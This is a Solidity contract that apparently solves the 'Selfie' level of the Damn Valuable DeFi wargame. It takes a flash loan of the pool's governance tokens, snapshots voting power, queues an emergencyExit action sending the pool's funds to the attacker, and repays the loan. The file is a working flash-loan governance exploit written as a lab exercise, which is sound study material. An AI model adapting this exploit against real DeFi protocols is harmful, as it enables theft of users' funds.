// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import {SelfiePool} from "../selfie/SelfiePool.sol";
import {SimpleGovernance} from "../selfie/SimpleGovernance.sol";

import "hardhat/console.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    error SelfieAttack__LenderUnknown();
    error SelfieAttack__LoanInitiatorUnknown();

    address private immutable owner;
    SimpleGovernance private immutable governance;
    SelfiePool private immutable poolVictime;
    DamnValuableTokenSnapshot public immutable governanceToken;

    constructor(address _governance, address _poolVictime) {
        owner = msg.sender;
        governance = SimpleGovernance(_governance);
        poolVictime = SelfiePool(_poolVictime);
        governanceToken = DamnValuableTokenSnapshot(address(poolVictime.token()));
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        if (msg.sender != address(poolVictime)) {
            revert SelfieAttack__LenderUnknown();
        }

        if (initiator != address(this)) {
            revert SelfieAttack__LoanInitiatorUnknown();
        }
        // Approve token to be returned to the pool lender
        governanceToken.approve(address(poolVictime), amount);

        // Exploit
        governanceToken.snapshot();
        governance.queueAction(address(poolVictime), 0, abi.encodeWithSignature("emergencyExit(address)", owner));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function launchAttack() external {
        address tokenAdress = address(governanceToken);
        uint256 amount = poolVictime.maxFlashLoan(tokenAdress);
        poolVictime.flashLoan(this, tokenAdress, amount, "0x");
    }
}
